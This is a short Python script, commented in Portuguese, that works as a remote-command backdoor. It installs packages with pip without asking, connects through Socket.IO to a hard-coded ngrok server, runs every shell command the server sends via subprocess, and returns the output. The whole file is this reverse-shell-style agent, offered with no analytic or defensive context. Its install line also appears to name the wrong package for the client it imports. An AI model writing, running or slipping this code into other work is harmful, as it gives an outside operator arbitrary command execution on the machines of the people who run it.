import os
import subprocess
import sys

def instalar(pkg):

    try:
        __import__(pkg)

    except ImportError:

        print("Instalando", pkg)

        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg]
        )

# instalar dependências automaticamente
instalar("socketio")
instalar("requests")

import socketio

SERVER = "https://unreclining-melinda-intercarpellary.ngrok-free.dev"

sio = socketio.Client()

@sio.event
def connect():

    print("Conectado ao servidor")


@sio.on("cmd")
def executar(cmd):

    print("Executando:", cmd)

    result = subprocess.getoutput(cmd)

    sio.emit("log", result)


try:

    sio.connect(SERVER)

    sio.wait()

except Exception as e:

    print("Erro:", e)
